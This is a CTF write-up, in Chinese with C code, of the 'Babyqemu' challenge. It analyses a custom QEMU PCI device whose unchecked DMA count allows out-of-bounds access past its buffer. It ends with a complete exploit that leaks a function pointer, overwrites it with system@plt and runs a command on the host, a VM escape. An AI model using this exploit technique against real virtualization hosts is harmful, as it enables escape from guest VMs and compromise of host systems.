## Pwn

### Babyqemu

launch.sh:

```bash
#! /bin/sh
./qemu-system-x86_64 \
-initrd ./rootfs.cpio \
-kernel ./vmlinuz-4.8.0-52-generic \
-append 'console=ttyS0 root=/dev/ram oops=panic panic=1' \
-enable-kvm \
-monitor /dev/null \
-m 64M --nographic  -L ./dependency/usr/local/share/qemu \
-L pc-bios \
# 掛了一個叫做 hitb 的 device
-device hitb,id=vda
```



共有以下 functions:

- `hitb_enc()`: 會對 buffer 的每個 byte 做 xor `0x66`:

- `hitb_instance_init()`

- `hitb_class_init()` 初始化 PCI device

  - ```c
    void __fastcall hitb_class_init(ObjectClass_0 *a1, void *data)
    {
      PCIDeviceClass *v2; // rax
    
      v2 = object_class_dynamic_cast_assert(
             a1,
             &stru_64A230.bulk_in_pending[2].data[72],
             &stru_5AB2C8.msi_vectors,
             469,
             "hitb_class_init");
      v2->revision = 0x10;
      v2->class_id = 0xFF;
      v2->realize = pci_hitb_realize; // 實體化呼叫到的 function
      v2->exit = pci_hitb_uninit; // 離開時呼叫的 function
      v2->vendor_id = 0x1234;
      v2->device_id = 0x2333;
    }
    ```

  - 從 `lspci` 的輸出能得知 HITB 的 pci slot 為 `00:04.0`:

    ```
    00:00.0 Class 0600: 8086:1237
    00:01.3 Class 0680: 8086:7113
    00:03.0 Class 0200: 8086:100e
    00:01.1 Class 0101: 8086:7010
    00:02.0 Class 0300: 1234:1111
    00:01.0 Class 0601: 8086:7000
    00:04.0 Class 00ff: 1234:2333
    ```

  - `cat /sys/devices/pci0000\:00/0000\:00\:04.0/resource`

    - `0x00000000fea00000 0x00000000feafffff 0x0000000000040200`
    - 看來 mmio 的大小為 `0x100000`

- 存取主要是透過 mmio:

  - `hitb_mmio_read()`
    - 根據傳入 addr 的不同會回傳不同的結果:
      - `0x80` - `opaque->dma.src`
      - `0x8C` - `*(&opaque->dma.dst + 4)`
      - `0x84` - `*(&opaque->dma.src + 4)`
      - `0x88` - `opaque->dma.dst`
      - `0x90` - `opaque->dma.cnt`
      - `0x98` - `opaque->dma.cmd`
      - `0x8` - `opaque->fact`
      - `0x0` - `0x10000ED`
      - `0x4` - `opaque->addr4`
      - `0x20` - `opaque->status`
      - `0x24` - `opaque->irq_status`
  - `hitb_mmio_write()` 相對複雜:
    - 雖然也是看 addr 來做不同的行為，但是大多操作都需要滿足 `(opaque->dma.cmd & 1) == 0`  才能執行
    - `0x80` - `opaque->dma.src = val`
    - `0x8C` - `*(&opaque->dma.dst + 4) = val`
    - `0x90` - `opaque->dma.cnt = val`
    - `0x98` - `opaque->dma.cmd = val`
      - 除此之外還會 trigger timer function `dma_timer()`
    - `0x84` - `*(&opaque->dma.src + 4) = val`
    - `0x88` - `opaque->dma.dst = val`
    - `0x20` - trigger lock
    - `0x60`, `0x64`  - `hitb.irq_status` 相關操作
    - `0x4` - `opaque->addr4 = ~val`
    - `0x8` - `opaque->fact = _val`

- `dma_timer()` 的程式碼如下:

  ```c
  void __fastcall hitb_dma_timer(HitbState *opaque)
  {
    dma_addr_t cmd; // rax
    __int64 v2; // rdx
    uint8_t *cnt_low; // rsi
    dma_addr_t v4; // rax
    dma_addr_t v5; // rdx
    uint8_t *v6; // rbp
    char *v7; // rbp
  
    cmd = opaque->dma.cmd;
    if ( (cmd & 1) != 0 ) // 0b1 (做事)
    {
      if ( (cmd & 2) != 0 ) // 0b11 （寫入)
      {
        v2 = (LODWORD(opaque->dma.src) - 0x40000); // index == dma.src - 0x40000
        if ( (cmd & 4) != 0 ) // 0b111 (encode)
        {
          v7 = &opaque->dma_buf[v2]; // get buf start
          opaque->enc(v7, opaque->dma.cnt); // enc dma.cnt 個 bytes
          cnt_low = v7;
        }
        else // 0b011
        {
          cnt_low = &opaque->dma_buf[v2]; // 不做 enc
        }
        // cpu_physical_memory_rw(hwaddr addr, uint8_t *buf, int len, int is_write)
        // 1 -> write to buffer
        // 從 cnt_low 讀 opaque->dma.cnt 個字元寫入 opaque->dma.dst 內
        cpu_physical_memory_rw(opaque->dma.dst, cnt_low, opaque->dma.cnt, 1);
        v4 = opaque->dma.cmd;
        v5 = v4 & 4; // & 0b100 --> if enc
      }
      else // 0b01 (讀取)
      {
        // v6 應該要是某塊 buffer 的位址
        v6 = &opaque[-36] + opaque->dma.dst - 2824;
        LODWORD(cnt_low) = opaque + opaque->dma.dst - 0x40000 + 3000;
        // 0 -> read from phymem
        // 從 opaque->dma.src 讀 opaque->dma.cnt 個字元寫入 v6 內
        cpu_physical_memory_rw(opaque->dma.src, v6, opaque->dma.cnt, 0);
        v4 = opaque->dma.cmd;
        v5 = v4 & 4;
        if ( (v4 & 4) != 0 ) // 0b101 (encode)
        {
          cnt_low = LODWORD(opaque->dma.cnt);
          // enc(buf, len)
          opaque->enc(v6, cnt_low);
          v4 = opaque->dma.cmd;
          v5 = v4 & 4;
        }
      }
      opaque->dma.cmd = v4 & 0xFFFFFFFFFFFFFFFELL;
      if ( v5 ) // if enc
      {
        opaque->irq_status |= 0x100u; // update irq status
        hitb_raise_irq(opaque, cnt_low);
      }
    }
  }
  ```

  - 這個 device 實作了 DMA(Direct Memory Access) 的機制，允許不同速度的硬體裝置與記憶體溝通，並把資料先複製到其他 memory region 做操作，之後在寫回去
    - `HitbState.dma_buf` 為 DMA buffer，大小為 4096 (0x1000)
      - 而 member `dma_buf` 後面接著是 function pointer `enc`，如果能做到 overflow，則可以控制程式執行流程
  - 因為 `opaque->dma.cnt` 的大小可以控制，因此可以再配合 dma read / write 做到 oob，覆蓋 `enc` 成 `system@plt`，最後呼叫 `enc("touch Z")` 做到 VM escape



exploit:

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdint.h>
#include <inttypes.h>
#include <sys/mman.h>

#define PFN_PRESENT (1ull << 63)
#define DMABUF_MAPPED_SIZE 0x1000
#define DMA_BASE 0x40000

unsigned char *mmio_mem, *dmabuf;
uint64_t dmabuf_phys_addr;

void pexit(const char *msg)
{
	perror(msg);
    exit(1);
}

uint64_t mmio_read(uint64_t offset)
{
	return *((uint64_t *)(mmio_mem + offset));
}

void mmio_write(uint64_t offset, uint64_t val)
{
	*((uint64_t *)(mmio_mem + offset)) = val;
}

void dma_setsrc(uint64_t src) { mmio_write(0x80, src); }
void dma_setdst(uint64_t dst) { mmio_write(0x88, dst); }
void dma_setcnt(uint64_t cnt) { mmio_write(0x90, cnt); }
void dma_trigger(uint64_t cmd) { mmio_write(0x98, cmd); }

void dma_read(uint64_t addr, size_t len)
{
    dma_setsrc(addr);
    dma_setdst(dmabuf_phys_addr);
	dma_setcnt(len);
    
    // 從 addr 寫到 dmabuf，再從 dmabuf 讀
    // 雖然 cpu_physical_memory_rw() 是做 write，但實際上可以從 dmabuf 讀
    dma_trigger(0b11);
    sleep(1);
}

void dma_write(uint64_t addr, unsigned char *buf, size_t len)
{
    if (len > DMABUF_MAPPED_SIZE)
        pexit("[-] too large");
    
   	memcpy(dmabuf, buf, len);
    dma_setsrc(dmabuf_phys_addr);
    dma_setdst(addr);
	dma_setcnt(len);
    
    // 從 dmabuf 的 physical address 寫資料到 addr 內
    // 雖然 cpu_physical_memory_rw() 是做 read，但實際上做的是 oob write
    dma_trigger(0b01);
    sleep(1);
}

void dma_enc(uint64_t addr, size_t len)
{
    dma_setsrc(addr);
    dma_setdst(dmabuf_phys_addr);
	dma_setcnt(len);
    dma_trigger(0b111);
    sleep(1);
}

uint64_t virt2phys(unsigned char *p)
{
    uint64_t virt = (uint64_t) p;
    if (virt & 0xfff != 0)
        pexit("[-] virt not aligned");
    
    int fd = open("/proc/self/pagemap", O_RDONLY);
    if (fd == -1)
        pexit("[-] open /proc/self/pagemap failed");
    
    // I don't know why needs to *8
    uint64_t offset = (virt / 0x1000) * 8;
    lseek(fd, offset, SEEK_SET);
    
    uint64_t phys;
    read(fd, &phys, 8);
    if (!(phys & PFN_PRESENT))
        pexit("[-] read /proc/self/pagemap failed");
    
    phys &= (1 << 54) - 1;
    phys <<= 12; // * 0x1000
    return phys;
}

void hexdump(uint64_t *ptr, size_t cnt)
{
    puts("------ [hexdump] ------");
    for (int i = 0; i < cnt; i++)
     	printf("[*] %02x - 0x%016" PRIx64 "\n", i, *(ptr + i));
}

int main()
{
    int fd = open("/sys/devices/pci0000:00/0000:00:04.0/resource0", O_RDWR | O_SYNC);
    if (fd == -1)
        pexit("[-] open resource0 failed");
    
    // device memory mapping
    mmio_mem = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
    if (mmio_mem == MAP_FAILED)
        pexit("[-] mmap mmio failed");
    
    // create dma buffer and obtain its phys addr
    dmabuf = (unsigned char *) mmap(0, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0);
    if (dmabuf == MAP_FAILED)
        pexit("[-] mmap dmabuf failed");
    mlock(dmabuf, 0x1000);
    dmabuf_phys_addr = virt2phys(dmabuf);
    printf("[+] dma_phys:\t0x%016" PRIx64 "\n", dmabuf_phys_addr);
    
    // 0x1000 == &opaque->enc - &opaque->dma_buf
    dma_read(DMA_BASE + 0x1000, 8);
    hexdump((uint64_t *) dmabuf, 0x10);
    uint64_t enc_addr = *((uint64_t *) dmabuf);
    uint64_t code = enc_addr - 0x283dd0;
    uint64_t system_plt = code + 0x1fdb18;
	printf("[+] enc_addr:\t0x%016" PRIx64 "\n", enc_addr);
	printf("[+] code:\t0x%016" PRIx64 "\n", code);
    printf("[+] system_plt:\t0x%016" PRIx64 "\n", system_plt);
   
    dma_write(DMA_BASE + 0x1000, &system_plt, 8);

    char *cmd = "touch Z";
    dma_write(DMA_BASE + 0x100, cmd, strlen(cmd));
    dma_enc(DMA_BASE + 0x100, 0x8);
    
    return 0;   
}
```

